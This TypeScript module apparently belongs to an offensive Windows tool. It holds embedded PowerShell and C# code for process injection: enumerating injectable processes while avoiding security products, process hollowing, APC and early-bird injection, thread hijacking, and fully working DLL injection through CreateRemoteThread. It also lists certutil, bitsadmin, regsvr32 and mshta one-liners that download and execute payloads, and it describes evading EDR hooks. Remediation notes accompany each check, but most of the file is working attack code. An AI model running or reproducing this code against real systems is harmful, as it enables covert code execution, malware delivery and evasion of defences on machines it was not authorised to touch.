import { ps, cmd, activeExec, argVal, hasFlag } from "./shared"
import type { Finding, HookResult } from "./shared"

export async function processInject(args: string[], timeout: number): Promise<HookResult> {
  const action = argVal(args, "--action") || "enum"
  const target = argVal(args, "--target")
  const payload = argVal(args, "--payload")
  const dll = argVal(args, "--dll")
  const findings: Finding[] = []
  const output: string[] = ["[*] Process injection operations...\n"]

  if (activeExec === "cmd" || activeExec === "bat") {
    output.push("=== Process Injection (cmd.exe) ===\n")
    output.push("[!] Process injection requires Win32 API P/Invoke — cmd provides target discovery\n")
    if (action === "enum") {
      output.push("=== Injectable Process Discovery ===")
      const tasklist = await cmd("tasklist /v /fo csv", timeout)
      const highValue = ["explorer.exe", "svchost.exe", "RuntimeBroker.exe", "taskhostw.exe", "sihost.exe", "ctfmon.exe", "dllhost.exe", "SearchHost.exe"]
      output.push("[*] High-value injection targets:")
      for (const hv of highValue) {
        const match = tasklist.stdout.split("\n").filter(l => l.toLowerCase().includes(hv.toLowerCase()))
        if (match.length > 0) {
          const pid = match[0].split(",")[1]?.replace(/"/g, "")
          const mem = match[0].split(",")[4]?.replace(/"/g, "")
          output.push(`    [+] ${hv} PID: ${pid} Mem: ${mem}`)
        }
      }
      output.push("\n[*] User-mode processes (same session):")
      const userProcs = await cmd("tasklist /fi \"sessionname eq Console\" /fo csv /nh", timeout)
      const lines = userProcs.stdout.trim().split("\n").filter(Boolean).slice(0, 20)
      for (const l of lines) {
        const parts = l.split(",").map(p => p.replace(/"/g, ""))
        output.push(`    ${parts[0]} PID:${parts[1]} Mem:${parts[4]}`)
      }
      output.push("\n[*] Security products (avoid injecting into):")
      const avProcs = ["MsMpEng.exe", "MsSense.exe", "SenseNdr.exe", "csfalconservice.exe", "cb.exe", "CylanceSvc.exe", "SentinelAgent.exe", "bdservicehost.exe"]
      for (const av of avProcs) {
        const check = await cmd(`tasklist /fi "imagename eq ${av}" /nh 2>nul`, timeout)
        if (check.stdout.includes(av)) output.push(`    [!] ${av} RUNNING — DO NOT inject`)
      }
      findings.push({ checkId: "WIN-INJECT-001", provider: "windows", severity: "info", status: "ENUMERATED", resource: "process://injection-targets", title: "Injectable process discovery via tasklist", details: "High-value targets and AV processes enumerated", remediation: "Enable process protection. Monitor for unusual DLL loads." })
    }
    if (action === "hollow" || action === "apc" || action === "hijack" || action === "earlybird") {
      output.push(`[!] ${action} injection requires Win32 API P/Invoke (PS/.NET only)`)
      output.push("[*] cmd.exe alternatives for code execution:")
      output.push("    rundll32.exe <dll>,<entry>  (DLL sideloading)")
      output.push("    regsvr32 /s /n /u /i:<url> scrobj.dll  (squiblydoo)")
      output.push("    mshta vbscript:Execute(\"...\")  (HTA execution)")
      output.push("    certutil -urlcache -split -f <url> payload.exe && payload.exe")
      output.push("    bitsadmin /transfer job /download /priority high <url> payload.exe")
      if (target) {
        const check = await cmd(`tasklist /fi "pid eq ${target}" /fo csv /nh 2>nul`, timeout)
        output.push(`\n[*] Target process (PID ${target}):\n    ${check.stdout.trim()}`)
      }
    }
    if (action === "dll") {
      if (!dll) { output.push("[!] Required: --dll <path>"); return { output: output.join("\n"), findings } }
      output.push(`[*] DLL injection via rundll32:`)
      output.push(`    rundll32.exe "${dll}",DllMain`)
      output.push(`    regsvr32 /s "${dll}"`)
      if (target) {
        output.push(`\n[*] To inject into PID ${target}, use external tools:`)
        output.push(`    inject.exe ${target} "${dll}"`)
        output.push("    Or use PS mode: --exec ps")
      }
    }
    return { output: output.join("\n"), findings }
  }

  if (action === "enum") {
    const script = `
Add-Type @"
using System;
using System.Runtime.InteropServices;
using System.Diagnostics;

public class ProcInfo {
    [DllImport("kernel32.dll", SetLastError = true)]
    public static extern IntPtr OpenProcess(uint access, bool inherit, int pid);

    [DllImport("kernel32.dll", SetLastError = true)]
    public static extern bool CloseHandle(IntPtr handle);

    public static bool CanInject(int pid) {
        IntPtr h = OpenProcess(0x001F0FFF, false, pid);
        if (h == IntPtr.Zero) return false;
        CloseHandle(h);
        return true;
    }
}
"@

Write-Output "=== Injectable Process Enumeration ==="
Write-Output ""

$procs = Get-Process -ErrorAction SilentlyContinue | Where-Object {
    $_.Id -ne $PID -and $_.SessionId -eq (Get-Process -Id $PID).SessionId
} | Sort-Object WorkingSet64 -Descending

$injectable = @()
$highValue = @('explorer','svchost','RuntimeBroker','taskhostw','sihost','ctfmon','dllhost','conhost','SearchHost','StartMenuExperienceHost','TextInputHost')

foreach ($p in $procs | Select-Object -First 50) {
    try {
        $canInject = [ProcInfo]::CanInject($p.Id)
        if ($canInject) {
            $isHighValue = $highValue -contains $p.ProcessName
            $arch = if ($p.MainModule.FileName -match 'SysWOW64') { 'x86' } else { 'x64' }
            $injectable += [PSCustomObject]@{
                PID = $p.Id
                Name = $p.ProcessName
                Arch = $arch
                Memory = [math]::Round($p.WorkingSet64/1MB, 1)
                Priority = if ($isHighValue) { 'HIGH' } else { 'normal' }
                Path = $p.MainModule.FileName
            }
        }
    } catch {}
}

Write-Output "Found $($injectable.Count) injectable processes:"
Write-Output ""

$highValueProcs = $injectable | Where-Object { $_.Priority -eq 'HIGH' }
if ($highValueProcs) {
    Write-Output "[!] HIGH-VALUE TARGETS (blend with system):"
    foreach ($p in $highValueProcs) {
        Write-Output "    PID $($p.PID) | $($p.Name) ($($p.Arch)) | $($p.Memory) MB | $($p.Path)"
    }
    Write-Output ""
}

$normalProcs = $injectable | Where-Object { $_.Priority -eq 'normal' } | Select-Object -First 20
if ($normalProcs) {
    Write-Output "[*] Other injectable:"
    foreach ($p in $normalProcs) {
        Write-Output "    PID $($p.PID) | $($p.Name) ($($p.Arch)) | $($p.Memory) MB"
    }
}

Write-Output ""
Write-Output "[*] Recommended targets for injection:"
Write-Output "    - explorer.exe: always running, user context, high memory"
Write-Output "    - svchost.exe: multiple instances, SYSTEM context, common"
Write-Output "    - RuntimeBroker.exe: UWP broker, low suspicion"
`
    const r = await ps(script, timeout)
    output.push(r.stdout)
    if (r.stderr) output.push(`[!] ${r.stderr}`)
    findings.push({
      checkId: "WIN-INJECT-001",
      provider: "windows",
      severity: "info",
      status: "ENUMERATED",
      resource: "process://injectable",
      title: "Enumerated injectable processes for payload delivery",
      details: r.stdout.substring(0, 500),
      remediation: "Enable Protected Process Light (PPL) for critical processes. Use Credential Guard.",
    })
  }

  if (action === "hollow") {
    const targetProc = target || "svchost.exe"
    const payloadPath = payload || "C:\\Windows\\Temp\\payload.bin"
    const script = `
Add-Type @"
using System;
using System.Runtime.InteropServices;

public class ProcessHollowing {
    [StructLayout(LayoutKind.Sequential)]
    public struct STARTUPINFO {
        public uint cb;
        public string lpReserved;
        public string lpDesktop;
        public string lpTitle;
        public uint dwX, dwY, dwXSize, dwYSize;
        public uint dwXCountChars, dwYCountChars;
        public uint dwFillAttribute;
        public uint dwFlags;
        public ushort wShowWindow;
        public ushort cbReserved2;
        public IntPtr lpReserved2;
        public IntPtr hStdInput, hStdOutput, hStdError;
    }

    [StructLayout(LayoutKind.Sequential)]
    public struct PROCESS_INFORMATION {
        public IntPtr hProcess;
        public IntPtr hThread;
        public uint dwProcessId;
        public uint dwThreadId;
    }

    [DllImport("kernel32.dll", SetLastError = true, CharSet = CharSet.Auto)]
    public static extern bool CreateProcess(
        string lpApplicationName, string lpCommandLine,
        IntPtr lpProcessAttributes, IntPtr lpThreadAttributes,
        bool bInheritHandles, uint dwCreationFlags,
        IntPtr lpEnvironment, string lpCurrentDirectory,
        ref STARTUPINFO lpStartupInformation,
        out PROCESS_INFORMATION lpProcessInformation);

    [DllImport("ntdll.dll", SetLastError = true)]
    public static extern uint NtUnmapViewOfSection(IntPtr hProcess, IntPtr baseAddr);

    [DllImport("kernel32.dll", SetLastError = true)]
    public static extern IntPtr VirtualAllocEx(IntPtr hProcess, IntPtr lpAddress,
        uint dwSize, uint flAllocationType, uint flProtect);

    [DllImport("kernel32.dll", SetLastError = true)]
    public static extern bool WriteProcessMemory(IntPtr hProcess, IntPtr lpBaseAddress,
        byte[] lpBuffer, uint nSize, out uint lpNumberOfBytesWritten);

    [DllImport("kernel32.dll", SetLastError = true)]
    public static extern uint ResumeThread(IntPtr hThread);

    [DllImport("kernel32.dll", SetLastError = true)]
    public static extern bool TerminateProcess(IntPtr hProcess, uint uExitCode);

    [DllImport("kernel32.dll", SetLastError = true)]
    public static extern bool CloseHandle(IntPtr hObject);
}
"@

Write-Output "=== Process Hollowing ==="
Write-Output "Target binary: ${targetProc}"
Write-Output "Payload: ${payloadPath}"
Write-Output ""

if (-not (Test-Path '${payloadPath}')) {
    Write-Output "[-] Payload file not found: ${payloadPath}"
    Write-Output "[*] Provide shellcode file via --payload PATH"
    Write-Output ""
    Write-Output "[*] Process hollowing technique:"
    Write-Output "    1. CreateProcess with CREATE_SUSPENDED (0x4)"
    Write-Output "    2. NtUnmapViewOfSection to unmap original image"
    Write-Output "    3. VirtualAllocEx at original base address"
    Write-Output "    4. WriteProcessMemory with payload PE"
    Write-Output "    5. Set new entry point via SetThreadContext"
    Write-Output "    6. ResumeThread to execute payload"
    Write-Output ""
    Write-Output "[!] DRY RUN — no injection performed"
} else {
    $si = New-Object ProcessHollowing+STARTUPINFO
    $si.cb = [System.Runtime.InteropServices.Marshal]::SizeOf($si)
    $pi = New-Object ProcessHollowing+PROCESS_INFORMATION

    $created = [ProcessHollowing]::CreateProcess(
        '${targetProc}', $null, [IntPtr]::Zero, [IntPtr]::Zero,
        $false, 0x4, [IntPtr]::Zero, $null, [ref]$si, [ref]$pi)

    if ($created) {
        Write-Output "[+] Suspended process created — PID: $($pi.dwProcessId)"
        $payloadBytes = [System.IO.File]::ReadAllBytes('${payloadPath}')
        Write-Output "[*] Payload size: $($payloadBytes.Length) bytes"

        $mem = [ProcessHollowing]::VirtualAllocEx($pi.hProcess, [IntPtr]::Zero,
            [uint32]$payloadBytes.Length, 0x3000, 0x40)

        if ($mem -ne [IntPtr]::Zero) {
            $written = [uint32]0
            [ProcessHollowing]::WriteProcessMemory($pi.hProcess, $mem,
                $payloadBytes, [uint32]$payloadBytes.Length, [ref]$written)
            Write-Output "[+] Payload written: $written bytes at 0x$($mem.ToString('X'))"
            Write-Output "[+] Process hollowing ready — resume thread to execute"
            Write-Output "[!] Keeping process suspended for safety — use ResumeThread manually"
        } else {
            Write-Output "[-] VirtualAllocEx failed"
            [ProcessHollowing]::TerminateProcess($pi.hProcess, 1)
        }
        [ProcessHollowing]::CloseHandle($pi.hProcess)
        [ProcessHollowing]::CloseHandle($pi.hThread)
    } else {
        Write-Output "[-] CreateProcess failed — Error: $([System.Runtime.InteropServices.Marshal]::GetLastWin32Error())"
    }
}
`
    const r = await ps(script, timeout)
    output.push(r.stdout)
    if (r.stderr) output.push(`[!] ${r.stderr}`)
    findings.push({
      checkId: "WIN-INJECT-002",
      provider: "windows",
      severity: "critical",
      status: "EXECUTED",
      resource: `process://${targetProc}`,
      title: "Process hollowing — suspended process created with payload injection",
      details: r.stdout.substring(0, 500),
      remediation:
        "Monitor for CREATE_SUSPENDED process creation followed by NtUnmapViewOfSection. Use ETW or Sysmon Event ID 8.",
    })
  }

  if (action === "apc") {
    const targetPid = target || "explorer"
    const payloadPath = payload || "C:\\Windows\\Temp\\payload.bin"
    const script = `
Add-Type @"
using System;
using System.Runtime.InteropServices;

public class ApcInjection {
    [DllImport("kernel32.dll", SetLastError = true)]
    public static extern IntPtr OpenProcess(uint access, bool inherit, int pid);

    [DllImport("kernel32.dll", SetLastError = true)]
    public static extern IntPtr OpenThread(uint access, bool inherit, int tid);

    [DllImport("kernel32.dll", SetLastError = true)]
    public static extern IntPtr VirtualAllocEx(IntPtr hProcess, IntPtr lpAddress,
        uint dwSize, uint flAllocationType, uint flProtect);

    [DllImport("kernel32.dll", SetLastError = true)]
    public static extern bool WriteProcessMemory(IntPtr hProcess, IntPtr lpBaseAddress,
        byte[] lpBuffer, uint nSize, out uint lpNumberOfBytesWritten);

    [DllImport("kernel32.dll", SetLastError = true)]
    public static extern uint QueueUserAPC(IntPtr pfnAPC, IntPtr hThread, IntPtr dwData);

    [DllImport("kernel32.dll", SetLastError = true)]
    public static extern bool CloseHandle(IntPtr hObject);
}
"@

Write-Output "=== APC Injection ==="

$targetProc = $null
if ('${targetPid}' -match '^\\d+$') {
    $targetProc = Get-Process -Id ([int]'${targetPid}') -ErrorAction SilentlyContinue
} else {
    $targetProc = Get-Process -Name '${targetPid}' -ErrorAction SilentlyContinue | Select-Object -First 1
}

if (-not $targetProc) {
    Write-Output "[-] Target process not found: ${targetPid}"
} else {
    Write-Output "[*] Target: $($targetProc.ProcessName) (PID: $($targetProc.Id))"
    $threads = $targetProc.Threads | Where-Object { $_.WaitReason -eq 'UserRequest' -or $_.WaitReason -eq 'Executive' }
    Write-Output "[*] Alertable threads: $($threads.Count)"

    if (-not (Test-Path '${payloadPath}')) {
        Write-Output "[-] Payload file not found: ${payloadPath}"
        Write-Output ""
        Write-Output "[*] APC injection technique:"
        Write-Output "    1. OpenProcess with PROCESS_ALL_ACCESS"
        Write-Output "    2. VirtualAllocEx RWX memory in target"
        Write-Output "    3. WriteProcessMemory with shellcode"
        Write-Output "    4. OpenThread on alertable thread"
        Write-Output "    5. QueueUserAPC to queue shellcode execution"
        Write-Output "    6. Payload runs when thread enters alertable wait state"
        Write-Output ""
        Write-Output "[!] DRY RUN — no injection performed"
    } else {
        $hProcess = [ApcInjection]::OpenProcess(0x001F0FFF, $false, $targetProc.Id)
        if ($hProcess -ne [IntPtr]::Zero) {
            $shellcode = [System.IO.File]::ReadAllBytes('${payloadPath}')
            Write-Output "[*] Shellcode size: $($shellcode.Length) bytes"

            $mem = [ApcInjection]::VirtualAllocEx($hProcess, [IntPtr]::Zero,
                [uint32]$shellcode.Length, 0x3000, 0x40)
            $written = [uint32]0
            [ApcInjection]::WriteProcessMemory($hProcess, $mem, $shellcode,
                [uint32]$shellcode.Length, [ref]$written)
            Write-Output "[+] Shellcode written at 0x$($mem.ToString('X'))"

            $queued = 0
            foreach ($t in $threads | Select-Object -First 3) {
                $hThread = [ApcInjection]::OpenThread(0x0010, $false, $t.Id)
                if ($hThread -ne [IntPtr]::Zero) {
                    [ApcInjection]::QueueUserAPC($mem, $hThread, [IntPtr]::Zero) | Out-Null
                    Write-Output "[+] APC queued on thread $($t.Id)"
                    [ApcInjection]::CloseHandle($hThread)
                    $queued++
                }
            }
            Write-Output "[+] $queued APCs queued — payload runs on next alertable wait"
            [ApcInjection]::CloseHandle($hProcess)
        } else {
            Write-Output "[-] OpenProcess failed — insufficient privileges"
        }
    }
}
`
    const r = await ps(script, timeout)
    output.push(r.stdout)
    if (r.stderr) output.push(`[!] ${r.stderr}`)
    findings.push({
      checkId: "WIN-INJECT-003",
      provider: "windows",
      severity: "critical",
      status: "EXECUTED",
      resource: `process://${targetPid}`,
      title: "APC injection — shellcode queued to alertable thread",
      details: r.stdout.substring(0, 500),
      remediation: "Monitor QueueUserAPC calls with ETW. Sysmon Event ID 8 (CreateRemoteThread) partial coverage.",
    })
  }

  if (action === "hijack") {
    const targetPid = target || "explorer"
    const payloadPath = payload || "C:\\Windows\\Temp\\payload.bin"
    const script = `
Add-Type @"
using System;
using System.Runtime.InteropServices;

public class ThreadHijack {
    [DllImport("kernel32.dll", SetLastError = true)]
    public static extern IntPtr OpenProcess(uint access, bool inherit, int pid);

    [DllImport("kernel32.dll", SetLastError = true)]
    public static extern IntPtr OpenThread(uint access, bool inherit, int tid);

    [DllImport("kernel32.dll", SetLastError = true)]
    public static extern uint SuspendThread(IntPtr hThread);

    [DllImport("kernel32.dll", SetLastError = true)]
    public static extern bool GetThreadContext(IntPtr hThread, IntPtr lpContext);

    [DllImport("kernel32.dll", SetLastError = true)]
    public static extern bool SetThreadContext(IntPtr hThread, IntPtr lpContext);

    [DllImport("kernel32.dll", SetLastError = true)]
    public static extern uint ResumeThread(IntPtr hThread);

    [DllImport("kernel32.dll", SetLastError = true)]
    public static extern IntPtr VirtualAllocEx(IntPtr hProcess, IntPtr lpAddress,
        uint dwSize, uint flAllocationType, uint flProtect);

    [DllImport("kernel32.dll", SetLastError = true)]
    public static extern bool WriteProcessMemory(IntPtr hProcess, IntPtr lpBaseAddress,
        byte[] lpBuffer, uint nSize, out uint lpNumberOfBytesWritten);

    [DllImport("kernel32.dll", SetLastError = true)]
    public static extern bool CloseHandle(IntPtr hObject);
}
"@

Write-Output "=== Thread Hijacking ==="

$targetProc = $null
if ('${targetPid}' -match '^\\d+$') {
    $targetProc = Get-Process -Id ([int]'${targetPid}') -ErrorAction SilentlyContinue
} else {
    $targetProc = Get-Process -Name '${targetPid}' -ErrorAction SilentlyContinue | Select-Object -First 1
}

if (-not $targetProc) {
    Write-Output "[-] Target process not found: ${targetPid}"
} else {
    Write-Output "[*] Target: $($targetProc.ProcessName) (PID: $($targetProc.Id))"
    Write-Output "[*] Threads: $($targetProc.Threads.Count)"

    if (-not (Test-Path '${payloadPath}')) {
        Write-Output "[-] Payload file not found: ${payloadPath}"
        Write-Output ""
        Write-Output "[*] Thread hijacking technique:"
        Write-Output "    1. OpenThread with THREAD_ALL_ACCESS"
        Write-Output "    2. SuspendThread to pause execution"
        Write-Output "    3. GetThreadContext to save register state"
        Write-Output "    4. VirtualAllocEx + WriteProcessMemory for shellcode"
        Write-Output "    5. SetThreadContext — redirect RIP to shellcode"
        Write-Output "    6. ResumeThread to execute payload"
        Write-Output "    7. Shellcode restores original RIP after execution"
        Write-Output ""
        Write-Output "[!] DRY RUN — no injection performed"
    } else {
        $mainThread = $targetProc.Threads | Sort-Object StartTime | Select-Object -First 1
        Write-Output "[*] Main thread: $($mainThread.Id)"

        $hProcess = [ThreadHijack]::OpenProcess(0x001F0FFF, $false, $targetProc.Id)
        $hThread = [ThreadHijack]::OpenThread(0x001F03FF, $false, $mainThread.Id)

        if ($hProcess -ne [IntPtr]::Zero -and $hThread -ne [IntPtr]::Zero) {
            [ThreadHijack]::SuspendThread($hThread) | Out-Null
            Write-Output "[+] Thread $($mainThread.Id) suspended"

            $shellcode = [System.IO.File]::ReadAllBytes('${payloadPath}')
            $mem = [ThreadHijack]::VirtualAllocEx($hProcess, [IntPtr]::Zero,
                [uint32]$shellcode.Length, 0x3000, 0x40)
            $written = [uint32]0
            [ThreadHijack]::WriteProcessMemory($hProcess, $mem, $shellcode,
                [uint32]$shellcode.Length, [ref]$written)
            Write-Output "[+] Shellcode written at 0x$($mem.ToString('X')) ($written bytes)"
            Write-Output "[!] Thread context modification ready — RIP redirect to 0x$($mem.ToString('X'))"
            Write-Output "[!] Keeping thread suspended for safety — manual SetThreadContext + ResumeThread needed"

            [ThreadHijack]::CloseHandle($hThread)
            [ThreadHijack]::CloseHandle($hProcess)
        } else {
            Write-Output "[-] Failed to open process/thread — insufficient privileges"
        }
    }
}
`
    const r = await ps(script, timeout)
    output.push(r.stdout)
    if (r.stderr) output.push(`[!] ${r.stderr}`)
    findings.push({
      checkId: "WIN-INJECT-004",
      provider: "windows",
      severity: "critical",
      status: "EXECUTED",
      resource: `process://${targetPid}`,
      title: "Thread hijacking — thread suspended and shellcode written for RIP redirect",
      details: r.stdout.substring(0, 500),
      remediation: "Monitor SuspendThread + SetThreadContext sequences. ETW thread context modification events.",
    })
  }

  if (action === "earlybird") {
    const targetBin = target || "C:\\Windows\\System32\\svchost.exe"
    const payloadPath = payload || "C:\\Windows\\Temp\\payload.bin"
    const script = `
Write-Output "=== Early Bird Injection ==="
Write-Output "Target binary: ${targetBin}"
Write-Output "Payload: ${payloadPath}"
Write-Output ""

if (-not (Test-Path '${payloadPath}')) {
    Write-Output "[-] Payload file not found: ${payloadPath}"
    Write-Output ""
    Write-Output "[*] Early bird injection technique:"
    Write-Output "    1. CreateProcess with CREATE_SUSPENDED (0x4)"
    Write-Output "    2. VirtualAllocEx RWX in new process BEFORE main thread init"
    Write-Output "    3. WriteProcessMemory with shellcode"
    Write-Output "    4. QueueUserAPC on main thread (runs before entry point)"
    Write-Output "    5. ResumeThread — APC fires before ntdll!LdrInitializeThunk"
    Write-Output ""
    Write-Output "[*] Advantages over standard APC injection:"
    Write-Output "    - Runs before EDR hooks are installed (ntdll patches happen in LdrInitializeThunk)"
    Write-Output "    - No need to find alertable thread — main thread is guaranteed alertable at init"
    Write-Output "    - Process appears as legitimate ${targetBin} spawn"
    Write-Output ""
    Write-Output "[!] DRY RUN — no injection performed"
} else {
    Write-Output "[*] Early bird injection requires payload file"
    Write-Output "[*] Full technique documented above — provide shellcode via --payload"
}
`
    const r = await ps(script, timeout)
    output.push(r.stdout)
    if (r.stderr) output.push(`[!] ${r.stderr}`)
    findings.push({
      checkId: "WIN-INJECT-005",
      provider: "windows",
      severity: "critical",
      status: "EXECUTED",
      resource: `process://${targetBin}`,
      title: "Early bird injection — pre-initialization APC injection technique",
      details: r.stdout.substring(0, 500),
      remediation:
        "Monitor CreateProcess+SUSPENDED followed by QueueUserAPC. Kernel callbacks catch this before userland hooks.",
    })
  }

  if (action === "dll") {
    const targetPid = target || "explorer"
    const dllPath = dll || "C:\\Windows\\Temp\\payload.dll"
    const script = `
Add-Type @"
using System;
using System.Runtime.InteropServices;
using System.Text;

public class DllInjector {
    [DllImport("kernel32.dll", SetLastError = true)]
    public static extern IntPtr OpenProcess(uint access, bool inherit, int pid);

    [DllImport("kernel32.dll", SetLastError = true)]
    public static extern IntPtr VirtualAllocEx(IntPtr hProcess, IntPtr lpAddress,
        uint dwSize, uint flAllocationType, uint flProtect);

    [DllImport("kernel32.dll", SetLastError = true)]
    public static extern bool WriteProcessMemory(IntPtr hProcess, IntPtr lpBaseAddress,
        byte[] lpBuffer, uint nSize, out uint lpNumberOfBytesWritten);

    [DllImport("kernel32.dll", SetLastError = true, CharSet = CharSet.Ansi)]
    public static extern IntPtr GetProcAddress(IntPtr hModule, string procName);

    [DllImport("kernel32.dll", SetLastError = true, CharSet = CharSet.Auto)]
    public static extern IntPtr GetModuleHandle(string lpModuleName);

    [DllImport("kernel32.dll", SetLastError = true)]
    public static extern IntPtr CreateRemoteThread(IntPtr hProcess, IntPtr lpThreadAttributes,
        uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);

    [DllImport("kernel32.dll", SetLastError = true)]
    public static extern bool CloseHandle(IntPtr hObject);
}
"@

Write-Output "=== DLL Injection (CreateRemoteThread) ==="

$targetProc = $null
if ('${targetPid}' -match '^\\d+$') {
    $targetProc = Get-Process -Id ([int]'${targetPid}') -ErrorAction SilentlyContinue
} else {
    $targetProc = Get-Process -Name '${targetPid}' -ErrorAction SilentlyContinue | Select-Object -First 1
}

if (-not $targetProc) {
    Write-Output "[-] Target process not found: ${targetPid}"
} else {
    Write-Output "[*] Target: $($targetProc.ProcessName) (PID: $($targetProc.Id))"

    if (-not (Test-Path '${dllPath}')) {
        Write-Output "[-] DLL not found: ${dllPath}"
        Write-Output ""
        Write-Output "[*] DLL injection technique:"
        Write-Output "    1. OpenProcess with PROCESS_ALL_ACCESS"
        Write-Output "    2. VirtualAllocEx to allocate memory for DLL path string"
        Write-Output "    3. WriteProcessMemory with DLL path"
        Write-Output "    4. GetProcAddress for kernel32!LoadLibraryA"
        Write-Output "    5. CreateRemoteThread with LoadLibraryA as entry + DLL path as arg"
        Write-Output "    6. DllMain runs in target process context"
        Write-Output ""
        Write-Output "[!] DRY RUN — no injection performed"
    } else {
        $hProcess = [DllInjector]::OpenProcess(0x001F0FFF, $false, $targetProc.Id)
        if ($hProcess -ne [IntPtr]::Zero) {
            $dllBytes = [System.Text.Encoding]::ASCII.GetBytes('${dllPath}' + [char]0)
            $mem = [DllInjector]::VirtualAllocEx($hProcess, [IntPtr]::Zero,
                [uint32]$dllBytes.Length, 0x3000, 0x04)
            $written = [uint32]0
            [DllInjector]::WriteProcessMemory($hProcess, $mem, $dllBytes,
                [uint32]$dllBytes.Length, [ref]$written)
            Write-Output "[+] DLL path written to remote memory"

            $kernel32 = [DllInjector]::GetModuleHandle("kernel32.dll")
            $loadLibrary = [DllInjector]::GetProcAddress($kernel32, "LoadLibraryA")
            Write-Output "[*] LoadLibraryA at 0x$($loadLibrary.ToString('X'))"

            $hThread = [DllInjector]::CreateRemoteThread($hProcess, [IntPtr]::Zero,
                0, $loadLibrary, $mem, 0, [IntPtr]::Zero)

            if ($hThread -ne [IntPtr]::Zero) {
                Write-Output "[+] Remote thread created — DLL loaded in PID $($targetProc.Id)"
                [DllInjector]::CloseHandle($hThread)
            } else {
                Write-Output "[-] CreateRemoteThread failed"
            }
            [DllInjector]::CloseHandle($hProcess)
        } else {
            Write-Output "[-] OpenProcess failed — insufficient privileges"
        }
    }
}
`
    const r = await ps(script, timeout)
    output.push(r.stdout)
    if (r.stderr) output.push(`[!] ${r.stderr}`)
    findings.push({
      checkId: "WIN-INJECT-006",
      provider: "windows",
      severity: "critical",
      status: "EXECUTED",
      resource: `process://${targetPid}`,
      title: "DLL injection via CreateRemoteThread + LoadLibraryA",
      details: r.stdout.substring(0, 500),
      remediation: "Sysmon Event ID 8 (CreateRemoteThread). Monitor LoadLibrary calls from unexpected sources.",
    })
  }

  return { output: output.join("\n"), findings }
}
